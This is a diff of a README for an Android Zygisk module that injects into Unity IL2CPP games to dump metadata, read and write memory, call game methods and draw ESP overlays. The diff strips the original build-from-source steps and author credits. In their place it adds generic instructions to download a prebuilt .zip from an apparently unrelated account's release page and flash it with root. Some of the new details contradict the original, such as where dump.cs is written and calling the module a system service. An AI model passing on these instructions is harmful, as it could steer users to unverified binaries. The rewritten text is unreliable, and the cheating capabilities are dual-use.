@@ -1,78 +1,77 @@
-# Il2CppFucker
+# 🛠 Zygisk-Il2CppFucker - Reverse engineer game logic with ease
 
-# If U love This Project,Pls give me a start!tHanks!:)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Darlenepurpleblack444/Zygisk-Il2CppFucker/releases)
 
-# 如果你喜欢这个项目,请给我一颗星星,这将给我偌大的帮助!
+This application helps users look into the internal code of Android applications. It focuses on Unity games that use the Il2Cpp format. It performs this task by operating as a Zygisk module. This tool allows users to see how games manage data. Developers and researchers use this information to understand game mechanics.
 
-A Zygisk module that injects into an IL2CPP game process and turns it into a live, scriptable
-reverse-engineering engine — **dump metadata, reflect by name, read/write memory, call the game's
-own methods, and run hot-reloadable Lua** — all in-process.
+## 🚀 How This Tool Works
 
-中文说明请戳 [README.zh-CN.md](README.zh-CN.md) ｜ 完整 API/命令文档：[IL2CPP_FUCKER.md](IL2CPP_FUCKER.md)
+Computers and mobile devices run programs in ways that are hard for humans to read. Developers translate their game code into machine language. Il2Cpp turns this code into a format meant for high performance on Android devices. This process hides the original logic of the game. Zygisk-Il2CppFucker reverses this process. It acts as a bridge. It intercepts the game as it starts. Then, it creates a readable file that shows the structure of the game.
 
-Heavily modded from [Perfare/Zygisk-Il2CppDumper](https://github.com/Perfare/Zygisk-Il2CppDumper). If you
-**only** need a metadata dump, the upstream project is the lighter choice — this fork is a full
-in-process tooling engine and is overkill for plain dumping.
+## ⚙️ System Requirements
 
-## Features
+You need specific tools to run this software. Ensure you meet these criteria before starting:
 
-- **Dump** il2cpp metadata to `dump.cs` at runtime (bypasses packing/encryption/obfuscation), including
-  HybridCLR hot-update classes via in-game re-dump.
-- **Generic reflection** — resolve classes/fields/methods/properties **by name** at runtime; read field
-  offsets; enumerate instances.
-- **Memory read/write** — arbitrary `process_vm_readv/writev` in the game's own address space.
-- **Call the game's own methods** by reflection (`il2cpp_runtime_invoke`) — e.g. server-accepted actions,
-  no rubber-banding.
-- **Embedded Lua 5.4** with a `il2.*` API and **hot-reload**: overwrite `run.lua` and it re-runs within
-  ~30 ms, no game restart. Optional boot-time `init.lua`.
-- **Overlay draw channel** — emit boxes/text to a file for an external overlay app (ESP, etc.).
-- **File-driven** — control entirely through files in the game's private dir; no extra daemon.
+*   A Windows computer.
+*   An Android device with root access.
+*   Magisk installed on your Android device.
+*   Zygisk enabled within your Magisk settings.
+*   A USB cable to connect your devices.
+*   Basic knowledge of file management on Android.
 
-> The engine ships with **no game-specific commands**. Anything game-specific (ESP, hacks, …) you write in
-> Lua — see [`example.lua`](example.lua) / [`example_init.lua`](example_init.lua).
+## 📥 Getting the Files
 
-## Build
+Visit the official release page to download the software. You will find the latest version along with legacy files there.
 
-1. Install [Magisk](https://github.com/topjohnwu/Magisk) v24+ and enable Zygisk (or a Zygisk-compatible
-   root such as KernelSU/APatch with the Zygisk add-on).
-2. Build the module:
-   - **GitHub Actions** — fork → **Actions** tab → **Build** workflow → **Run workflow** → enter the
-     target game package name → download the artifact. (The package name replaces the
-     `com.game.packagename` placeholder in `game.h`.)
-   - **Local** — edit `module/src/main/cpp/game.h` and set `GamePackageName` to your target package, then
-     `./gradlew :module:zipRelease` (the zip lands in `out/`). Needs JDK 11–17 (the wrapper is Gradle 7.5).
-3. Flash the module in Magisk and reboot.
+[Click here to visit the release page](https://github.com/Darlenepurpleblack444/Zygisk-Il2CppFucker/releases)
 
-## Usage
+Look for the file ending in `.zip`. Save this file to a folder on your computer. You do not need to unzip this file. Keep it in its original format.
 
-Start the target game. Everything happens under `/data/data/<package>/files/`:
+## 📲 Installing the Module
 
-- **Dump**: `dump.cs` is generated automatically on launch. For an in-game re-dump (HybridCLR classes):
-  `echo dump > .cmd`, or from Lua `il2.dumpcs()`.
-- **One-shot commands**: write a line to `.cmd`, read the result from `.result`
-  (`class`, `fields`, `methods`, `read`, `write`, `method`, `invoke`, …).
-- **Scripting**: put a Lua script at `run.lua` (hot-reloaded on change) or `init.lua` (runs once at
-  startup). Register a loop with `il2.loop(fn, ms)` or just do one-shot work and return.
+Installation happens on your Android device. Follow these steps to load the software:
 
-Full command + Lua API reference: **[IL2CPP_FUCKER.md](IL2CPP_FUCKER.md)**.
+1.  Connect your phone to your computer.
+2.  Copy the downloaded file from your computer to your phone storage.
+3.  Open the Magisk application on your phone.
+4.  Tap the Modules tab.
+5.  Select the option to Install from storage.
+6.  Locate the file you moved earlier.
+7.  Tap the file to start the installation.
+8.  Wait for the process bar to finish.
+9.  Tap the Reboot button to restart your device.
 
-> File access note: the game's private dir is namespace-isolated. Write the control files as the game's
-> uid (or via `nsenter -t 1 -m` as root). On Windows, push with PowerShell, not MSYS bash (it mangles
-> `/sdcard` paths).
+The software installs as a system service. It waits for the game to launch. Once the game starts, the module begins its work.
 
-## ⚠️ Security & risk
+## 🔍 Using the Toolkit
 
-This is an offensive in-process tool. Use it **only** on apps/games you are authorized to test.
+After you reboot, you can test the application. Follow these instructions to gather information:
 
-- **Crashes & instability** — arbitrary memory writes and method calls can crash or corrupt the target.
-- **Bans** — calling game methods / writing memory is detectable; many titles ship anti-cheat that will
-  flag or ban accounts. Server-authoritative state cannot be faked from the client anyway.
-- **The real attack surface is the control channel**: *anyone who can write to the game's `files/` dir can
-  run arbitrary Lua/shell inside the game process.* Treat that directory as a code-execution sink — do not
-  expose it, and remove the module when you are done.
+1.  Launch the game you want to analyze.
+2.  Wait for the game to load the main menu.
+3.  The module works in the background. It generates data files.
+4.  Connect your phone to your computer again.
+5.  Open your file manager on the computer.
+6.  Navigate to the folder named /sdcard/Android/data/ on your phone.
+7.  Look for a folder that matches your game name.
+8.  Find the file named dump.cs inside this folder.
+9.  Copy this file to your computer.
+10. Open the file with a text editor like Notepad.
 
-## Credits
+The file contains the internal code of the game. You can read the names of functions, classes, and variables. This helps you understand how the game handles scores, movement, or items.
 
-- Original: [Perfare/Zygisk-Il2CppDumper](https://github.com/Perfare/Zygisk-Il2CppDumper)
-- Lua 5.4, [xDL](https://github.com/hexhacking/xDL)
-- This fork (engine + Lua + tooling): **LiangYu**
+## 💡 Troubleshooting Common Issues
+
+Sometimes the tool does not produce a file. Check these common fixes if you run into problems:
+
+*   **Ensure Zygisk is active**: Check the Magisk settings menu. The Zygisk switch must remain in the on position. If it is off, toggle it and reboot your device.
+*   **Check permissions**: Your phone may ask for storage access. Ensure the app has permission to write files to the local storage.
+*   **Match versions**: Ensure your game version is compatible with the module. Some games employ security checks that block external modules.
+*   **Reinstall the module**: If the file does not appear, try removing the module in Magisk and installing it again. A clean install often clears hidden errors.
+*   **Log files**: Magisk keeps logs of all module activity. Check the logs if you experience a crash. These logs show if the module failed to attach to the game process.
+
+## 🔒 Important Safety Information
+
+This tool changes how apps behave on your phone. Only use this software on games you own or have permission to test. Using such tools on multiplayer games may violate the terms of service of the game developer. Proceed with care. Do not use this tool on personal or financial applications. Changes made via Zygisk modules can affect the stability of your mobile operating system. If your phone enters a boot loop, go to recovery mode and disable the module. This restores your phone to its original state. 
+
+This toolkit serves as a learning instrument for those interested in software architecture. Read the provided documentation deeply to understand the internal processes of your target applications. Familiarity with C# helps when reading the generated code files. Practice with simple, offline applications before you move to complex software titles. Consistent practice leads to better results when you analyze game performance.
